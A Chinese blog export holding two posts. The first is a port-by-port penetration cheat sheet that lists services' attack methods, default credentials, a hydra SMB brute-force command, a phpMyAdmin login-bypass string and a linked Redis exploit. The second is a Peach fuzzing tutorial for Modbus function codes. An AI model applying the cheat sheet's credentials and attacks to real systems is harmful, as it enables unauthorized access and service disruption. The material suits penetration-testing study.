<h4><span id="默认端口">默认端口：</span></h4><p>20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：ftp的爆破工具有很多，这里我推荐owasp的Bruter 以及msf中ftp爆破模块；</li>
<li>匿名访问：用户名：anonymous  密码：为空或任意邮箱</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名：FTP            密码：FTP或为空</span><br><span class="line">用户名：USET         密码：pass</span><br><span class="line">当然还有不需要用户名密码直接访问的，一般出现在局域网中</span><br></pre></td></tr></table></figure>
<h3><span id="nfs服务">NFS服务</span></h3><p>nfs：网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p>
<h4><span id="默认端口2049">默认端口：2049</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>未授权访问：未限制IP以及用户权限设置错误 </li>
</ul>
<h3><span id="samba服务">Samba服务</span></h3><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p>
<h4><span id="默认端口">默认端口：</span></h4><p>137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令（爆破工具采用hydra）hydra -l username -P PassFile IP smb</li>
<li>未授权访问：给予public用户高权限</li>
<li>远程代码执行漏洞：CVE-2015-0240等等</li>
</ul>
<h3><span id="ldap协议">LDAP协议</span></h3><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p>
<h4><span id="默认端口389">默认端口：389</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>注入攻击：盲注</li>
<li>未授权访问：</li>
<li>爆破：弱口令</li>
</ul>
<h2><span id="远程连接服务端口渗透">远程连接服务端口渗透</span></h2><h3><span id="ssh服务">SSH服务</span></h3><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p>
<h4><span id="默认端口22">默认端口：22</span></h4><h4><span id="攻击方式">攻击方式</span></h4><ul>
<li>爆破：弱口令、</li>
<li>漏洞：28退格漏洞、OpenSSL漏洞</li>
</ul>
<h3><span id="telnet服务">Telnet服务</span></h3><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p>
<h4><span id="默认端口23">默认端口：23</span></h4><h4><span id="攻击方式">攻击方式</span></h4><ul>
<li>爆破：弱口令</li>
<li>嗅探：此种情况一般发生在局域网；</li>
</ul>
<h3><span id="windows远程连接">Windows远程连接</span></h3><p>远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；</p>
<h4><span id="默认端口3389">默认端口：3389</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：3389端口爆破工具就有点多了</li>
<li>Shift粘滞键后门：5次shift后门</li>
<li>3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机；请参考</li>
</ul>
<h3><span id="vnc服务">VNC服务</span></h3><p>VNC：一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也</p>
<h4><span id="默认端口">默认端口：</span></h4><p>5900+桌面ID（5901；5902） </p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令</li>
<li>认证口令绕过：</li>
<li>拒绝服务攻击：（CVE-2015-5239）</li>
<li>权限提升：（CVE-2013-6886）</li>
</ul>
<h3><span id="pcanywhere服务">Pcanywhere服务</span></h3><p>PyAnywhere服务：一款远控工具，有点类似vnc的功能；这个服务在以前很多黑客发的视频里面都有，利用pcanywhere来进行提权；</p>
<h4><span id="默认端口5632">默认端口：5632</span></h4><h3><span id="攻击方式">攻击方式：</span></h3><ul>
<li>提权控制服务：</li>
<li>拒绝服务攻击：</li>
<li>代码执行：请参考</li>
</ul>
<h2><span id="web应用服务端口渗透">Web应用服务端口渗透</span></h2><p>HTTP服务：对于http服务其实是我们目前这几年比较常见的攻击入口，所以这里会针对http服务进行一个详细的详解；</p>
<p>注：这个板块的所有攻击方式，如果涉及到常规的web漏洞不会提出来，除非是特定的服务器才会产生的漏洞；</p>
<h3><span id="iis服务">IIS服务</span></h3><h4><span id="默认端口8081443">默认端口：80/81/443</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>IIS PUT写文件：利用IIS漏洞，put方法直接将文件放置到服务器上</li>
<li>短文件名泄漏：这种一般没啥影响</li>
<li>解析漏洞：详细见apache服务</li>
</ul>
<h3><span id="apachetomcatnginxaxis2">Apache/Tomcat/Nginx/Axis2</span></h3><h4><span id="默认端口808080">默认端口：80/8080</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令（爆破manager后台）</li>
<li>HTTP慢速攻击：可以把服务器打死，对一些大型的网站有影响；</li>
<li>解析漏洞：请参考</li>
</ul>
<h3><span id="weblogic">WebLogic</span></h3><h4><span id="默认端口7001">默认端口：7001</span></h4><p>攻击方式：</p>
<ul>
<li>爆破：弱口令 4组：用户名密码均一致：system weblogic（密码可能weblogic123） portaladmin guest</li>
<li>Congsole后台部署webshell：</li>
<li>Java反序列化：</li>
<li>泄漏源代码/列目录：这个太老了，估计网上都没有了吧！</li>
<li>SSRF窥探内网：央视网SSRF可窥探内网</li>
</ul>
<h3><span id="jboss">Jboss</span></h3><h4><span id="默认端口8080">默认端口8080</span></h4><p>其他端口1098/1099/4444/4445/8080/8009/8083/8093</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令（爆破jboss系统后台）</li>
<li>远程代码执行：由于配置不当造成</li>
<li>Java反序列化：</li>
</ul>
<h3><span id="websphere">Websphere</span></h3><h4><span id="默认端口908">默认端口：908*</span></h4><p>第一个应用就是9080，第二个就是9081；控制台9090</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令（控制台）</li>
<li>任意文件泄漏：（CVE-2014-0823）</li>
<li>Java反序列化</li>
</ul>
<h3><span id="glassfish">GlassFish</span></h3><h4><span id="默认端口">默认端口：</span></h4><p>http 8080；IIOP 3700；控制台4848</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令（对于控制台）</li>
<li>任意文件读取：</li>
<li>认证绕过：</li>
</ul>
<h3><span id="jenkins">Jenkins</span></h3><h4><span id="默认端口">默认端口：</span></h4><p>8080、8089</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令（默认管理员）</li>
<li>未授权访问：</li>
<li>反序列化：</li>
</ul>
<h3><span id="resin">Resin</span></h3><h4><span id="默认端口8080">默认端口：8080</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>目录遍历</li>
<li>远程文件读取</li>
</ul>
<h3><span id="jetty">Jetty</span></h3><h4><span id="默认端口8080">默认端口：8080</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>远程共享缓冲区溢出</li>
</ul>
<h3><span id="lotus">Lotus</span></h3><p>影响的都是一些大型的企业，特别需要注意，经过以前的测试发现弱口令这个问题经常都存在，可能是很多管理员不知道如何去修改（不要打我）。</p>
<h4><span id="默认端口1352">默认端口：1352</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令（admin password）控制台</li>
<li>信息泄露</li>
<li>跨站脚本攻击</li>
</ul>
<h2><span id="数据库服务端口渗透">数据库服务端口渗透</span></h2><p>针对所有的数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。</p>
<h3><span id="mysql数据库">MySQL数据库</span></h3><h4><span id="默认端口3306">默认端口：3306</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令</li>
<li>身份认证漏洞：CVE-2012-2122 </li>
<li>拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器</li>
<li>Phpmyadmin万能密码绕过：用户名：‘localhost’@’@”  密码任意</li>
</ul>
<h3><span id="mssql数据库">MSSQL数据库</span></h3><h4><span id="默认端口">默认端口：</span></h4><p>1433（Server 数据库服务）、1434（Monitor 数据库监控）</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令/使用系统用户</li>
</ul>
<h3><span id="oracle数据库">Oracle数据库</span></h3><h4><span id="默认端口">默认端口：</span></h4><p>1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）</p>
<p>攻击方式：</p>
<ul>
<li>爆破：弱口令</li>
<li>注入攻击；</li>
<li>漏洞攻击；</li>
</ul>
<h3><span id="postgresql数据库">PostgreSQL数据库</span></h3><p>PostgreSQL是一种特性非常齐全的自由软件的对象–关系型数据库管理系统，可以说是目前世界上最先进，功能最强大的自由数据库管理系统。包括我们kali系统中msf也使用这个数据库；浅谈postgresql数据库攻击技术  大部分关于它的攻击依旧是sql注入，所以注入才是数据库不变的话题。</p>
<h4><span id="默认端口5432">默认端口：5432</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令：postgres postgres</li>
<li>缓冲区溢出：CVE-2014-2669</li>
</ul>
<h3><span id="mongodb数据库">MongoDB数据库</span></h3><p>MongoDB：NoSQL数据库；攻击方法与其他数据库类似；关于它的安全讲解：请参考</p>
<h4><span id="默认端口27017">默认端口：27017</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问；github有攻击代码；请点击</li>
</ul>
<h3><span id="redis数据库">Redis数据库</span></h3><p>redis：是一个开源的使用c语言写的，支持网络、可基于内存亦可持久化的日志型、key-value数据库。关于这个数据库这两年还是很火的，暴露出来的问题也很多。特别是前段时间暴露的未授权访问。Exp：<a href="https://yunpan.cn/cYjzHxawFpyVt" target="_blank" rel="noopener">https://yunpan.cn/cYjzHxawFpyVt</a>  访问密码 e547</p>
<h4><span id="默认端口6379">默认端口：6379</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问+配合ssh key提权； </li>
</ul>
<h3><span id="sysbase数据库">SysBase数据库</span></h3><h4><span id="默认端口">默认端口：</span></h4><p>服务端口5000；监听端口4100；备份端口：4200</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令</li>
<li>命令注入：</li>
</ul>
<h3><span id="db2数据库">DB2数据库</span></h3><h4><span id="默认端口5000">默认端口：5000</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）</li>
</ul>
<h3><span id="couchdb数据库">CouchDB数据库</span></h3><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。</p>
<h4><span id="默认端口5984">默认端口：5984</span></h4><h4><span id="攻击方式">攻击方式</span></h4><ul>
<li>未授权访问</li>
</ul>
<p><a href="http://wooyun.jozxing.cc/static/drops/papers-16030.html" target="_blank" rel="noopener">利用CouchDB未授权访问漏洞执行任意系统命令</a></p>
<p>总结一下：对于数据库，我们得知端口很多时候可以帮助我们去渗透，比如得知mysql的数据库，我们就可以使用SQL注入进行mof、udf等方式提权；如果是mssql我们就可以使用xp_cmdshell来进行提权；如果是其它的数据库，我们也可以采用对应的方式；比如各大数据库对应它们的默认口令，版本对应的漏洞！</p>
<p>顺便提一下：很多时候银行企业采用的都是oracle、db2等大型数据库；</p>
<h2><span id="邮件服务端口渗透">邮件服务端口渗透</span></h2><h3><span id="smtp协议">SMTP协议</span></h3><p>smtp：邮件协议，在linux中默认开启这个服务，可以向对方发送钓鱼邮件！</p>
<h4><span id="默认端口">默认端口：</span></h4><p>25（smtp）、465（smtps）</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令</li>
<li>未授权访问</li>
</ul>
<h3><span id="pop3协议">POP3协议</span></h3><h4><span id="默认端口">默认端口：</span></h4><p>109（POP2）、110（POP3）、995（POP3S）</p>
<p>攻击方式：</p>
<ul>
<li>爆破；弱口令</li>
<li>未授权访问；</li>
</ul>
<h3><span id="imap协议">IMAP协议</span></h3><h4><span id="默认端口">默认端口：</span></h4><p>143（imap）、993（imaps）</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>爆破：弱口令</li>
<li>配置不当</li>
</ul>
<h2><span id="网络常见协议端口渗透">网络常见协议端口渗透</span></h2><h3><span id="dns服务">DNS服务</span></h3><h4><span id="默认端口53">默认端口：53</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>区域传输漏洞</li>
</ul>
<h3><span id="dhcp服务">DHCP服务</span></h3><h4><span id="默认端口">默认端口：</span></h4><p>67&amp;68、546（DHCP Failover做双机热备的）</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>DHCP劫持；</li>
</ul>
<h3><span id="snmp协议">SNMP协议</span></h3><h4><span id="默认端口161">默认端口：161</span></h4><h4><span id="攻击方式">攻击方式:</span></h4><ul>
<li>爆破：弱口令</li>
</ul>
<h2><span id="其他端口渗透">其他端口渗透</span></h2><h3><span id="hadoop文件服务">Hadoop文件服务</span></h3><p>默认端口：<a href="http://hsrong.iteye.com/blog/1374734" target="_blank" rel="noopener">请参考</a></p>
<h3><span id="zookeeper服务">Zookeeper服务</span></h3><p>zookeeper：分布式的，开放源码的分布式应用程序协调服务；提供功能包括：配置维护、域名服务、分布式同步、组服务等。详情请参考百度百科</p>
<h4><span id="默认端口2181">默认端口：2181</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>未授权访问；</li>
</ul>
<h3><span id="zabbix服务">Zabbix服务</span></h3><p>zabbix：基于Web界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。监视各种网络参数，保证服务器系统的安全运营。</p>
<h4><span id="默认端口8069">默认端口：8069</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>远程命令执行：</li>
</ul>
<h3><span id="elasticsearch服务">elasticsearch服务</span></h3><p>elasticsearch：请百度（因为我觉得我解释不清楚）</p>
<h3><span id="默认端口">默认端口：</span></h3><p>9200（）、9300（）</p>
<p>攻击方式：</p>
<ul>
<li>未授权访问；</li>
<li>远程命令执行；</li>
<li>文件遍历；</li>
<li>低版本webshell植入；</li>
</ul>
<h3><span id="memcache服务">memcache服务</span></h3><h4><span id="默认端口11211">默认端口：11211</span></h4><h3><span id="linux-r服务">Linux R服务</span></h3><p>R服务：TCP端口512,513和514为著名的rlogin提供服务。在系统中被错误配置从而允许远程访问者从任何地方访问（标准的，rhosts + +）。</p>
<h4><span id="默认端口">默认端口：</span></h4><p>512（remote process execution）；513（remote login a latelnet）；514（cmd）</p>
<h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>使用rlogin直接登录对方系统；</li>
</ul>
<h3><span id="rmi">RMI</span></h3><p>RMI：我们使用这两个端口很少的原因是因为必须是java，而且rmi穿越防火墙并不好穿越；这里我不会去涉及其他的东西，这里提出RMI只是因为在前段时间的java反序列化中，我们的小伙伴Bird写过一个weblogic利用工具，里面涉及到了RMI的一些东西，在有的时候使用socket不能成功时，我们可以使用RMI方式来进行利用；</p>
<h4><span id="默认端口1090-1099">默认端口：1090（）、1099（）</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>远程命令执行（java反序列化，调用rmi方式执行命令）</li>
</ul>
<h3><span id="rsync服务">Rsync服务</span></h3><p>Rsync：类UNIX系统下的数据备份工具（remote sync），属于增量备份；关于它的功能，大家自行百度百科吧，其实上面很多大家也看到了说是端口渗透，其实就是端口对应服务的渗透，服务一般出错就在配置或者版本问题上，rsync也不例外。Rsync默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。</p>
<h4><span id="默认端口873">默认端口：873</span></h4><h4><span id="攻击方式">攻击方式：</span></h4><ul>
<li>未授权访问；</li>
<li>本地提权：rsync默认以root运行，利用rsync上传一个文件，只要这个文件具有s权限，我们执行我们的攻击脚本就可以具有root权限。详细请参考 和 参考二</li>
</ul>
<h3><span id="socket代理">Socket代理</span></h3><h4><span id="默认端口1080">默认端口：1080</span></h4><p>Socket代理针对代理来说没有什么漏洞，一般只是在渗透过程中作为我们的代理，进入内网，或者渗透域和林的时候有帮助。这里不做过多描述，但是可以尝试爆破一下代理的用户名和密码，万一运气好能登录，不也~~~~</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/ports.png" alt=""></p>
<h2><span id="reference">Reference</span></h2><p>总结来源于网络</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Peach对Modbus功能码的模糊测试]]></title>
      <url>https://uknowsec.cn/posts/notes/Peach%E5%AF%B9Modbus%E5%8A%9F%E8%83%BD%E7%A0%81%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="基础知识">基础知识</span></h2><h3><span id="modbus功能码">Modbus功能码</span></h3><table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:center">中文名称</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>01</td>
<td style="text-align:center">读取线圈状态</td>
<td style="text-align:center">取得一组逻辑线圈的当前状态（ON/OFF)</td>
</tr>
<tr>
<td>02</td>
<td style="text-align:center">读取输入状态</td>
<td style="text-align:center">取得一组开关输入的当前状态（ON/OFF)</td>
</tr>
<tr>
<td>03</td>
<td style="text-align:center">读取保持寄存器</td>
<td style="text-align:center">在一个或多个保持寄存器中取得当前的二进制值</td>
</tr>
<tr>
<td>04</td>
<td style="text-align:center">读取输入寄存器</td>
<td style="text-align:center">在一个或多个输入寄存器中取得当前的二进制值</td>
</tr>
<tr>
<td>05</td>
<td style="text-align:center">强置单线圈</td>
<td style="text-align:center">强置一个逻辑线圈的通断状态</td>
</tr>
<tr>
<td>06</td>
<td style="text-align:center">预置单寄存器</td>
<td style="text-align:center">把具体二进值装入一个保持寄存器</td>
</tr>
<tr>
<td>07</td>
<td style="text-align:center">读取异常状态</td>
<td style="text-align:center">取得8个内部线圈的通断状态，这8个线圈的地址由控制器决定，用户逻辑可以将这些线圈定义，以说明从机状态，短报文适宜于迅速读取状态</td>
</tr>
<tr>
<td>08</td>
<td style="text-align:center">回送诊断校验</td>
<td style="text-align:center">把诊断校验报文送从机，以对通信处理进行评鉴</td>
</tr>
<tr>
<td>09</td>
<td style="text-align:center">编程（只用于484）</td>
<td style="text-align:center">使主机模拟编程器作用，修改PC从机逻辑</td>
</tr>
<tr>
<td>10</td>
<td style="text-align:center">控询（只用于484）</td>
<td style="text-align:center">可使主机与一台正在执行长程序任务从机通信，探询该从机是否已完成其操作任务，仅在含有功能码9的报文发送后，本功能码才发送</td>
</tr>
<tr>
<td>11</td>
<td style="text-align:center">读取事件计数</td>
<td style="text-align:center">可使主机发出单询问，并随即判定操作是否成功，尤其是该命令或其他应答产生通信错误时</td>
</tr>
<tr>
<td>12</td>
<td style="text-align:center">读取通信事件记录</td>
<td style="text-align:center">可是主机检索每台从机的ModBus事务处理通信事件记录。如果某项事务处理完成，记录会给出有关错误</td>
</tr>
<tr>
<td>13</td>
<td style="text-align:center">编程（184/384 484 584）</td>
<td style="text-align:center">可使主机模拟编程器功能修改PC从机逻辑</td>
</tr>
<tr>
<td>14</td>
<td style="text-align:center">探询（184/384 484 584）</td>
<td style="text-align:center">可使主机与正在执行任务的从机通信，定期控询该从机是否已完成其程序操作，仅在含有功能13的报文发送后，本功能码才得发送</td>
</tr>
<tr>
<td>15</td>
<td style="text-align:center">强置多线圈</td>
<td style="text-align:center">强置一串连续逻辑线圈的通断</td>
</tr>
<tr>
<td>16</td>
<td style="text-align:center">预置多寄存器</td>
<td style="text-align:center">把具体的二进制值装入一串连续的保持寄存器</td>
</tr>
<tr>
<td>17</td>
<td style="text-align:center">报告从机标识</td>
<td style="text-align:center">可使主机判断编址从机的类型及该从机运行指示灯的状态</td>
</tr>
<tr>
<td>18</td>
<td style="text-align:center">（884和MICRO 84）</td>
<td style="text-align:center">可使主机模拟编程功能，修改PC状态逻辑</td>
</tr>
<tr>
<td>19</td>
<td style="text-align:center">重置通信链路</td>
<td style="text-align:center">发生非可修改错误后，是从机复位于已知状态，可重置顺序字节</td>
</tr>
<tr>
<td>20</td>
<td style="text-align:center">读取通用参数（584L）</td>
<td style="text-align:center">显示扩展存储器文件中的数据信息</td>
</tr>
<tr>
<td>21</td>
<td style="text-align:center">写入通用参数（584L）</td>
<td style="text-align:center">把通用参数写入扩展存储文件，或修改之</td>
</tr>
</tbody>
</table>
<h3><span id="peach简介">Peach简介</span></h3><h4><span id="概述">概述</span></h4><p>Michael Eddington等人开发的Peach是一个遵守MIT开源许可证的模糊测试框架，最初采用Python语言编写，发布于2004年，第二版于2007年发布，最新的第三版使用C#重写了整个框架。</p>
<p>Peach支持对文件格式、ActiveX、网络协议、API等进行Fuzz测试；Peach Fuzz的关键是编写Peach Pit配置文件。</p>
<p>Windows下使用Peach3需要预先安装.net 4和windbg；Linux、OS X下需要安装Mono .net开发框架。</p>
<h4><span id="命令行参数">命令行参数</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/peachfuzz1.png" alt=""></p>
<ul>
<li>-1：执行第1次测试。</li>
<li><p>-a：启动Peach代理。不指定”channel”默认为本地代理（默认支持，无需显式启动）；<br>“channel”可以指定为”tcp”远程代理。</p>
</li>
<li><p>-c：统计测试用例数。</p>
</li>
<li>-t：验证Peach Pit xml文件正确性。</li>
<li>-p：并行Fuzz。运行Peach的机器总数为M，这是第N个。</li>
<li>–debug：调试信息开关。</li>
<li>–skipto：指定Fuzz跳过的测试用例数。</li>
<li>–range：指定Fuzz的测试用例范围。</li>
</ul>
<h3><span id="peach-pit">Peach Pit</span></h3><p>在使用Peach进行Fuzz之前需要编写被称为”Peach Pit”的xml配置文件，其中包含着如何进行Fuzz的关键信息，如下图：<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/peachfuzz2.png" alt=""></p>
<h3><span id="peach模糊测试">peach模糊测试</span></h3><p>在研究网络协议模糊测试时，sulley和peach两大框架是最常见的Fuzz框架，peach相对于sulley有以下几点优势：</p>
<ul>
<li>1、sulley目前已不再维护。</li>
<li>2、对sulley模糊测试编写程序，需要有一定的python语言基础。而peach是xml格式的，比较容易理解。</li>
<li>3、sulley配置环境相对繁琐，而peach配置环境相对简单（目前我手头有绿色版本，可以直接运行）。</li>
<li>4、sulley只能对网络协议进行模糊测试，而peach相对更加多样化。</li>
</ul>
<h2><span id="peach协议fuzz">Peach协议Fuzz</span></h2><h3><span id="工作流程图">工作流程图</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/peachfuzz3.png" alt=""></p>
<h4><span id="流程图具体工作原理">流程图具体工作原理</span></h4><ul>
<li>1、根据协议控制规范或者捕获工业控制网络协议数据流来构造正常的数据包；</li>
<li>2、分析正常协议的字段及其重要性；</li>
<li>3、根据分析的协议中不同的数据类型，设计有效地变异策略。</li>
<li>4、设计并实现工业控制网络协议数据包发包工具；</li>
<li>5、设计并实现代理器及监视器；</li>
<li>6、采用发包工具，将畸形数据包发送给被测工控目标；</li>
<li>7、通过监视器探测被测工控目标异常数据记录。</li>
</ul>
<h3><span id="networkxml简单分析">NetWork.xml简单分析</span></h3><p>在Peach的目录里有个samples目录,里面有官方给出的一些Pit，以NetWork.xml文件为例做一个简单的分析，具体如下：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/peachfuzz4.png" alt=""></p>
<h3><span id="modbus-fuzz-pit编写">Modbus Fuzz Pit编写</span></h3><p>由于是初次接触Peach对Modbus工控协议的模糊测试，目前也对Modbus协议不是很熟悉，所以只能在网络上找个各种资料。<br>经过一番寻找，最终在github上找到了一份Pit，就是关于对modbus功能码的Fuzz Peach Pit。文章Reference处给出链接。<br>简单地阅读和分析这个Pit发现，这个Pit对01 02 03 04 05 06 15 16 20 21 22 23 24 这几个功能进行Fuzz。除了22 23 24这几个功能码没有在文章开头提到，其他都在基础知识中有。关于22 23 24三个功能码具体如下</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:center">作用描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td style="text-align:center">屏蔽写寄存器</td>
</tr>
<tr>
<td>23</td>
<td style="text-align:center">读/写多个寄存器</td>
</tr>
<tr>
<td>24</td>
<td style="text-align:center">读FIFO队列</td>
</tr>
</tbody>
</table>
<p>另外发现，在我们找到的Pit中，缺少了Agents-Monitors部分即监听器模块部分。Agents部分可以在本地或远程运行，可以执行附加调试器的动作，看内存消耗，检测故障等。<br>查看官方文档可以知道Peach Fuzz根据不同的环境类型支持以下几种Monitors</p>
<p>Windows Monitors</p>
<ul>
<li>Windows Debugger Monitor</li>
<li>Cleanup Registry Monitor</li>
<li>Page Heap Monitor</li>
<li>Popup Watcher Monitor</li>
<li>Windows Service Monitor</li>
</ul>
<p>OS X Monitors</p>
<ul>
<li>OS X Crash Wrangler Monitor</li>
<li>OS X Crash Reporter Monitor</li>
</ul>
<p>Linux Monitors</p>
<ul>
<li>Linux Crash Monitor</li>
</ul>
<p>Cross Platform Monitors</p>
<ul>
<li>CanaKit Relay Monitor</li>
<li>Cleanup Folder Monitor</li>
<li>IpPower9258 Monitor</li>
<li>Memory Monitor</li>
<li>Pcap Network Monitor</li>
<li>Ping Monitor</li>
<li>Process Launcher Monitor</li>
<li>Process Killer Monitor</li>
<li>Save File Monitor</li>
<li>Socket Listener Monitor</li>
<li>SSH Monitor</li>
<li>SSH Downloader Monitor</li>
<li>Vmware Control Monitor</li>
</ul>
<p>由于我们是对Modbus工控协议的模糊测试，这里我们可以用常见的Ping Monitor和Socket Listener Monitor。经过向一些之前有过Modbus Peach Fuzz研究的前辈的请教，得到结果是用Ping Monitor的误报率比较高，所以我们在编写是使用的是Socket Listener Monitor。</p>
<p>以下给出Ping Monitor和Socket Listener Monitor的编写模板</p>
<h4><span id="ping-monitor">Ping Monitor</span></h4><p>Parameters</p>
<ul>
<li>Host — Hostname or IP address</li>
<li>Timeout — Timeout in milliseconds (optional, defaults to 1,000)</li>
<li>Data — Data to send in ping packet (optional)</li>
<li>FaultOnSuccess — Fault if ping is successful (optional, defaults to false)</li>
</ul>
<p>Examples<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Agent name=&quot;Local&quot;&gt;</span><br><span class="line">        &lt;Monitor class=&quot;Ping&quot;&gt;</span><br><span class="line">                &lt;Param name=&quot;Host&quot; value=&quot;www.google.com&quot; /&gt;</span><br><span class="line">        &lt;/Monitor&gt;</span><br><span class="line">&lt;/Agent&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="socket-monitor">Socket Monitor</span></h4><p>Parameters</p>
<ul>
<li>Host — IP address of remote host (optional, defaults to “”)</li>
<li>Interface — IP address of interface to listen on (optional, defaults to 0.0.0.0)</li>
<li>Port — Port to listen on (optional, defaults to 8080)</li>
<li>Protocol — Protocol type to listen for (optional, defaults to tcp)</li>
<li>Timeout — Length of time to wait for incoming connection (optional, defaults to 1000 ms)</li>
<li>FaultOnSuccess — Fault if no conection is recorded (optional, defaults to false)</li>
</ul>
<p>Examples<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Agent name=&quot;Local&quot;&gt;</span><br><span class="line">        &lt;Monitor class=&quot;Socket&quot;&gt;</span><br><span class="line">                &lt;Param name=&quot;Port&quot; value=&quot;53&quot; /&gt;</span><br><span class="line">        &lt;/Monitor&gt;</span><br><span class="line">&lt;/Agent&gt;</span><br></pre></td></tr></table></figure></p>
